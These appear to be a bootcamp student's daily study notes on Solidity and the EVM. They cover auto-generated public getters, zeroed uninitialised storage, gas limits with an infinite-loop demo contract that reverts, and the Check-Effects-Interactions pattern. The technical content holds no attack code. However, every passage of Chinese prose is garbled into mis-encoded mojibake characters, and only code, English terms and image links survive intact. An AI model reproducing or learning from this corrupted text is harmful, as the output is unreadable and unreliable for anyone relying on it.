-   **åŸç†ï¼ˆå…³é”®å­—** `public` **çš„é­”æ³•ï¼‰ï¼š** åœ¨ä»£ç ç¬¬ 18 è¡Œï¼š`mapping(uint256 => SensorData) public sensors;` å½“æ‚¨ç»™å˜é‡åŠ ä¸Š `public` å…³é”®å­—æ—¶ï¼Œç¼–è¯‘å™¨ï¼ˆSolidityï¼‰ä¼šè‡ªåŠ¨ä¸ºæ‚¨ç”Ÿæˆä¸€ä¸ª**åŒåçš„è¯»å–å‡½æ•°**ã€‚
    
-   **åµŒå…¥å¼ç±»æ¯”ï¼š**
    
    -   `getTemperature` **(æ‚¨å†™çš„å‡½æ•°):** å°±åƒæ‚¨å°è£…çš„ä¸€ä¸ª API `float Sensor_GetVal(id)`ã€‚å®ƒé‡Œé¢æœ‰é€»è¾‘ï¼ˆæ¯”å¦‚åˆ¤æ–­ `isValid`ï¼Œå¦‚æœæ— æ•ˆè¿”å› 0ï¼‰ã€‚
        
    -   `sensors` **(è‡ªåŠ¨ç”Ÿæˆçš„):** å°±åƒé€šè¿‡ **JTAG/è°ƒè¯•å™¨** ç›´æ¥æŸ¥çœ‹å†…å­˜åœ°å€ `0x20001000`ã€‚å®ƒä¸å¸¦ä»»ä½•é€»è¾‘ï¼Œç›´æ¥æŠŠé‚£ä¸ªå­˜å‚¨æ§½ï¼ˆSlotï¼‰é‡Œçš„åŸå§‹æ•°æ®ï¼ˆID, Temp, Timestamp, Boolï¼‰å…¨éƒ¨åå‡ºæ¥ç»™æ‚¨çœ‹ã€‚
        

**æ‰€ä»¥ï¼Œå®ƒçš„ç›®çš„æ˜¯ï¼š** è®©ï¼ˆå¼€å‘è€…ï¼‰æ–¹ä¾¿åœ°å»â€œæŸ¥è´¦â€ï¼ŒéªŒè¯æ•°æ®åˆ°åº•å­˜è¿›å»æ²¡æœ‰ã€‚

### å›°æƒ‘äºŒï¼šå®éªŒ C è¿”å› 0ï¼Œæ€ä¹ˆåˆ¤æ–­ bool å€¼ï¼Ÿ

**ç­”æ¡ˆï¼šé€šè¿‡** `getTemperature` **å‡½æ•°æ‚¨ç¡®å®åˆ¤æ–­ä¸äº†ï¼ˆå› ä¸ºå®ƒæŠŠ bool ä¸¢å¼ƒäº†ï¼‰ï¼Œä½†é€šè¿‡** `sensors` **å¯ä»¥çœ‹åˆ°ã€‚**

è¯·çœ‹ä»£ç å¯¹æ¯”ï¼š

**åœºæ™¯ï¼šè®¿é—®ä¸å­˜åœ¨çš„ ID (999)**

1.  **å¦‚æœæ‚¨è°ƒç”¨** `getTemperature(999)`**ï¼š**
    
    -   **ä»£ç é€»è¾‘ï¼š** å‡½æ•°ç­¾åæ˜¯ `returns (uint16)`ã€‚å†…éƒ¨é€»è¾‘æ˜¯ï¼šå¦‚æœ `isValid` æ˜¯ falseï¼Œåˆ™ `return 0`ã€‚
        
    -   **ç»“æœï¼š** åªæ‹¿åˆ°äº† `0`ã€‚æ­¤æ—¶ç¡®å®**æ— æ³•åŒºåˆ†**â€œè¿™æ˜¯çœŸçš„ 0 åº¦â€è¿˜æ˜¯â€œæ•°æ®ä¸å­˜åœ¨â€ã€‚è¿™æ­£æ˜¯è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ç¼ºé™·ï¼Œä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ Event æˆ– Revert
        
2.  **å¦‚æœæ‚¨è°ƒç”¨** `sensors(999)` **(è“è‰²çš„é‚£ä¸ªæŒ‰é’®)ï¼š**
    
    -   **è¯·ç°åœ¨å°è¯•æ“ä½œä¸€ä¸‹ï¼š** åœ¨ `sensors` æŒ‰é’®è¾“å…¥ 999ï¼Œç‚¹å‡» callã€‚
        
    -   **é¢„æœŸç»“æœï¼š** ä¹‹åä¼šçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„å…ƒç»„ï¼š
        
        Plaintext
        
        ```
        0: uint8: id 0
        1: uint16: temperature 0
        2: uint32: timestamp 0
        3: bool: isValid false   <-- è¿™é‡Œï¼
        ```
        
    -   **ç»“è®ºï¼š** åœ¨ Solidity ä¸­ï¼Œ**æ‰€æœ‰æœªåˆå§‹åŒ–çš„å†…å­˜éƒ½æ˜¯å…¨ 0**ï¼ˆbool çš„ 0 å°±æ˜¯ falseï¼‰ã€‚
<!-- DAILY_CHECKIN_2026-01-14_END -->

# 2026-01-13
<!-- DAILY_CHECKIN_2026-01-13_START -->


















# **Day 2ï¼šEVM æŒ‡ä»¤é›†ä¸ Gas æœºåˆ¶ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰**

## 1ï¼‰æŠŠ EVM å½“ä½œâ€œæŒ‰æŒ‡ä»¤è®¡è´¹ / åŸºäºå †æ ˆâ€çš„è™šæ‹Ÿ CPU

**EVM å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå †æ ˆæœºï¼ˆstack machineï¼‰**ï¼šå¤§å¤šæ•°è¿ç®—éƒ½åœ¨æ ˆé¡¶å®Œæˆï¼ˆpush / pop / opï¼‰ã€‚

Gas æœºåˆ¶å¯ä»¥ç†è§£ä¸º**â€œæŒ‰æŒ‡ä»¤ä¸èµ„æºæ¶ˆè€—è®¡è´¹â€**ï¼š

\- æŒ‡ä»¤æ‰§è¡Œè¦èŠ± Gas

\- è¯»å†™å­˜å‚¨ï¼ˆstorageï¼‰æ›´è´µ

\- è¶…å‡º Gas é™é¢å°±ä¼š\*\*å¼ºåˆ¶ç»ˆæ­¢å¹¶å›æ»š\*\*

\---

## **2ï¼‰ç†è®ºæ˜ å°„ï¼ˆåµŒå…¥å¼å¯¹ç…§ï¼‰**

\- **ARM Cortex-Mï¼šå¯„å­˜å™¨æ¶æ„ï¼ˆregister-basedï¼‰**

\- **EVMï¼šå †æ ˆæ¶æ„ï¼ˆstack-basedï¼‰**

\> åµŒå…¥å¼é‡Œä½ ç»å¸¸â€œèºè›³å£³å†…åšé“åœºâ€ï¼ŒRAM ç´§å¼ `uint8_t` / `uint16_t` ç”¨å¾—å¤šï¼›

\> ä½†åœ¨ Solidity/EVM é‡Œï¼Œå¾ˆå¤šæ—¶å€™æ›´æ¨èç›´æ¥ç”¨ EVM åŸç”Ÿå­—é•¿`uint256`ï¼ˆå¯¹é½ EVM 256-bit wordï¼‰ï¼Œé¿å…ä¸å¿…è¦çš„ç±»å‹è½¬æ¢æˆæœ¬å’Œå¤æ‚åº¦ã€‚

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-13-1768313068628-image.png)

\---

## 3ï¼‰å®è·µï¼šè§¦å‘ç¬¬ä¸€ä¸ªâ€œçœ‹é—¨ç‹—å¤ä½â€ï¼ˆGas è€—å°½ï¼‰

**ç›®æ ‡**ï¼šå†™ä¸€ä¸ªâ€œæ­»å¾ªç¯â€ï¼Œäº²çœ¼çœ‹è§ Gas å¦‚ä½•å¼ºè¡Œç»ˆæ­¢ç¨‹åºï¼ˆç±»æ¯” WDT Resetï¼‰ã€‚

\#### åˆçº¦ä»£ç 

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GasTest {

uint256 public counter = 0;

// ä¼šè§¦å‘â€œçœ‹é—¨ç‹—å¤ä½â€ï¼ˆGasè€—å°½ï¼‰çš„å‡½æ•°

function foreverLoop() public {

// while(true) çš„åŒºå—é“¾ç‰ˆæœ¬

while (true) {

counter++;

}

}

// æ­£å¸¸å‡½æ•°ï¼šç”¨äºå¯¹æ¯” Gas æ¶ˆè€—

function normalAdd() public {

counter++;

}

}

ç°è±¡è®°å½•

-   `normalAdd()` èƒ½æ­£å¸¸ç»™ `counter + 1`
    
-   `foreverLoop()` è°ƒç”¨å `counter` **ä¸ä¼šå¢åŠ **
    
    -   æˆ‘åœ¨è°ƒç”¨ `foreverLoop()` å‰åè¯»å– `counter`ï¼Œå‘ç°å€¼å®Œå…¨ä¸€æ ·
        
    -   è¯´æ˜ï¼šGas è€—å°½åäº¤æ˜“å¤±è´¥ï¼Œ**çŠ¶æ€è¢«å›æ»š**ï¼ˆincrement ä¹Ÿâ€œå½“æ²¡å‘ç”Ÿè¿‡â€ï¼‰
        

è¿›ä¸€æ­¥è§‚å¯Ÿ

-   åœ¨ **Compile Details** é‡ŒæŸ¥çœ‹ **BYTECODE**ï¼šåœ¨ opcodes ä¸­èƒ½çœ‹åˆ°å¤§é‡ `JUMP`
    
-   è¿™ä¸ªâ€œæ­»å¾ªç¯â€æœ¬è´¨å°±æ˜¯é  `JUMP` ä¸æ–­è·³è½¬å®ç°
    

* * *

### 4ï¼‰åæ€å¤ç›˜ï¼ˆå·¥ç¨‹ç»éªŒå›ºåŒ–ï¼‰

4.1 å¿Œè®³æ— ç•Œå¾ªç¯ï¼ˆUnbounded Loopï¼‰

æ°¸è¿œä¸è¦å†™è¿™ç§é€»è¾‘ï¼š

```solidity
for (uint i = 0; i < users.length; i++) { ... }
```

å› ä¸ºä¸€æ—¦ `users.length` å˜æˆ 10,000ï¼Œå¾ªç¯æ¬¡æ•°å¯èƒ½è¶…è¿‡åŒºå—å¯æ‰¿å—çš„ Gas ä¸Šé™ï¼Œå¯¼è‡´ï¼š

-   äº¤æ˜“æ°¸è¿œå¤±è´¥
    
-   å‡½æ•°é€»è¾‘ç­‰ä»·äºâ€œæ°¸ä¹…å¡æ­»ï¼Œå†ä¹Ÿè·‘ä¸èµ·æ¥â€
    

4.2 åµŒå…¥å¼ç±»æ¯”ï¼šISR é‡Œåšé‡æ´» = ç›´æ¥æŠŠç³»ç»Ÿæ‹–æ­»

è¿™å°±åƒä½ åœ¨ä¸­æ–­æœåŠ¡å‡½æ•°ï¼ˆISRï¼‰é‡Œå¡äº†ä¸€ä¸ªè€—æ—¶ 1 ç§’çš„æ“ä½œï¼š

-   ä¸»å¾ªç¯è¢«æ‰“æ–­
    
-   å®æ—¶æ€§å´©æ‰
    
-   ç³»ç»Ÿçœ‹èµ·æ¥â€œè¿˜æ´»ç€â€ï¼Œå…¶å®å·²ç»ä¸å¯ç”¨
    

4.3 Check-Effects-Interactionsï¼ˆCEIï¼‰ä¸å›æ»šç›´è§‰

-   ç”±äºä»¥å¤ªåŠçš„çŠ¶æ€å›æ»šæœºåˆ¶ï¼šåªè¦æœ€ç»ˆå¤±è´¥ï¼Œå‰é¢åšçš„çŠ¶æ€ä¿®æ”¹éƒ½ä¼šæ’¤é”€
    
-   æ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦æ‹…å¿ƒâ€œæ”¹äº†ä¸€åŠâ€çš„è„çŠ¶æ€æ®‹ç•™é—®é¢˜
    
-   ä½†ä»ç„¶è¦åšæŒ CEIï¼š
    
    -   **Check**ï¼šå…ˆæ ¡éªŒå‰ç½®æ¡ä»¶
        
    -   **Effects**ï¼šå†æ›´æ–°çŠ¶æ€
        
    -   **Interactions**ï¼šæœ€ååšå¤–éƒ¨äº¤äº’ï¼ˆé˜²é‡å…¥ã€é˜²æ„å¤–å¤±è´¥ï¼‰
        

* * *

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-13-1768313034569-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-13-1768313053291-image.png)
<!-- DAILY_CHECKIN_2026-01-13_END -->

# 2026-01-12
<!-- DAILY_CHECKIN_2026-01-12_START -->



















# **Day 1 å­¦ä¹ æ€»ç»“ï¼šæˆ‘å¼€å§‹ç”¨â€œç³»ç»Ÿå·¥ç¨‹â€ç†è§£ä»¥å¤ªåŠ**

ä»Šå¤©æˆ‘æœ€å¤§çš„æ”¶è·æ˜¯ï¼š

æˆ‘ä¸å†æŠŠä»¥å¤ªåŠå½“æˆâ€œè½¬è´¦ç½‘ç»œâ€ï¼Œè€Œæ˜¯æŠŠå®ƒå½“æˆä¸€ä¸ª**åˆ†å¸ƒå¼çŠ¶æ€æœº**ã€‚  
äº¤æ˜“ä¹Ÿä¸åªæ˜¯â€œè½¬é’±â€ï¼Œè€Œæ˜¯ä¸€æ¬¡æ¬¡**çŠ¶æ€å˜æ›´è¯·æ±‚**ï¼šæˆ‘ä»¬æŠŠè¯·æ±‚å¹¿æ’­å‡ºå»ï¼Œå…¨ç½‘éªŒè¯ã€æ’åºã€æ‰§è¡Œï¼Œç„¶åæŠŠç»“æœå†™è¿›ä¸€ä¸ªæ‰€æœ‰äººéƒ½èƒ½å¤ç®—çš„å…¬å…±çŠ¶æ€ã€‚å¾ˆåƒåšè‡ªåŠ¨åŒ–/å·¥ä½œæµâ€”â€”çœ‹æµç¨‹æ€ä¹ˆè·‘ã€æ—¥å¿—æ€ä¹ˆè®°ã€ç»“æœèƒ½ä¸èƒ½é‡æ”¾ï¼Œè€Œä¸æ˜¯æŸäº›å…¬å¸ï¼Œå…³é”®å…ˆç”Ÿä¸€è¨€å ‚ã€‚

**åŒºå—é“¾çš„æ ¸å¿ƒä¹Ÿä¸åªæ˜¯è´¦æœ¬**ï¼Œæ›´åƒä¸€å¥—â€œå¯éªŒè¯çš„åä½œåè®®â€ï¼š  
Web2 é ä¸­å¿ƒå¹³å°ã€æƒé™å’Œæ³•å¾‹èƒŒä¹¦ï¼›Web3 æŠŠè§„åˆ™å†™è¿›åˆçº¦ï¼Œç”¨å…±è¯†+å¯†ç å­¦+å¯é‡æ”¾æ—¥å¿—ä¿è¯ä¸€è‡´æ€§ã€‚

ä¿¡ä»»æ²¡æœ‰æ¶ˆå¤±ï¼Œåªæ˜¯ä»â€œä¿¡æœºæ„â€å˜æˆâ€œä¿¡è¿‡ç¨‹â€ï¼Œ**ä¿¡ä»»è¢«å·¥ç¨‹åŒ–äº†**ã€‚

**é’±åŒ…ä¸æ˜¯å­˜é’±çš„ï¼Œæ˜¯æ§åˆ¶æƒ**ï¼šå®ƒæœ¬è´¨æ˜¯**å¯†é’¥ç®¡ç†+ç­¾åå™¨**ã€‚ä½™é¢å˜åŒ–ä¸æ˜¯â€œé’±åŒ…é‡Œå¤šäº†é’±â€ï¼Œè€Œæ˜¯é“¾ä¸ŠçŠ¶æ€å˜äº†ã€‚

æˆ‘ä»¬çœŸæ­£æ‹¥æœ‰çš„ä¸æ˜¯è´¦æˆ·ï¼Œè€Œæ˜¯ç§é’¥è¿™æŠŠé’¥åŒ™ã€‚

**å®‰å…¨ä¸Šæˆ‘ä»Šå¤©è®°ä½ä¸€å¥è¯**ï¼šå±é™©çš„å¾€å¾€ä¸æ˜¯ valueï¼ˆè½¬å¤šå°‘ï¼‰ï¼Œè€Œæ˜¯ dataï¼ˆæˆ‘ä»¬ç­¾äº†ä»€ä¹ˆï¼‰ã€‚

å¾ˆå¤šäº‹æ•…ä¸æ˜¯è½¬è´¦ï¼Œè€Œæ˜¯**æˆæƒ/ç­¾å**æŠŠæƒé™äº¤å‡ºå»äº†ã€‚

**Gas å¯ä»¥ç†è§£ä¸ºä»˜è´¹è®¡ç®—+åæ»¥ç”¨**ï¼šgasUsed æ˜¯å®é™…æ¶ˆè€—ï¼ŒgasLimit æ˜¯é¢„ç®—ä¸Šé™ï¼Œå¤±è´¥ä¹Ÿä¼šèŠ±è´¹ï¼Œå› ä¸ºæ‰§è¡Œå‘ç”Ÿäº†åªæ˜¯å›æ»šã€‚

æœ€åï¼Œ**Sepolia æµ‹è¯•ç½‘ä¸æ˜¯ç©å…·**ï¼šå¯¹æˆ‘æ¥è¯´æœ€å€¼é’±çš„æ˜¯ç«¯åˆ°ç«¯é—­ç¯å’Œå¯è§‚æµ‹æ€§ï¼ˆhash/receipt/logs/nonce/revertï¼‰ã€‚

å®ƒæ˜¯ä¸»ç½‘çš„é¢„è®¾é¡¹ï¼Œåªæ˜¯å¸æ²¡ä»·å€¼ã€ç¨³å®šæ€§å¯èƒ½å·®ä¸€ç‚¹ã€‚

æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼š  
**ä»¥å¤ªåŠ=åˆ†å¸ƒå¼çŠ¶æ€æœºï¼›åŒºå—é“¾=å¯éªŒè¯åä½œï¼›é’±åŒ…=æ§åˆ¶æƒï¼›äº¤æ˜“=çŠ¶æ€å˜æ›´ï¼›Gas=ä»˜è´¹è®¡ç®—ï¼›æµ‹è¯•ç½‘=ä¸»ç½‘å½©æ’ã€‚**

_å°ç‹ç‹¸è½¬è´¦é’±åŒ…çš„æˆªå›¾_

![å±å¹•æˆªå›¾ 2026-01-12 193830.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-12-1768232261149-_____2026-01-12_193830.png)

_ç®€å•çœ‹äº†è€å¸ˆä»¬å†™çš„ä¹¦ï¼ˆæ£€è§†é˜…è¯»ï¼‰ï¼Œbuildingçš„æ¬²æœ›è¶Šæ¥è¶Šå¼ºçƒˆäº†_

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-12-1768232444538-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-12-1768232417925-image.png)
<!-- DAILY_CHECKIN_2026-01-12_END -->
<!-- Content_END -->
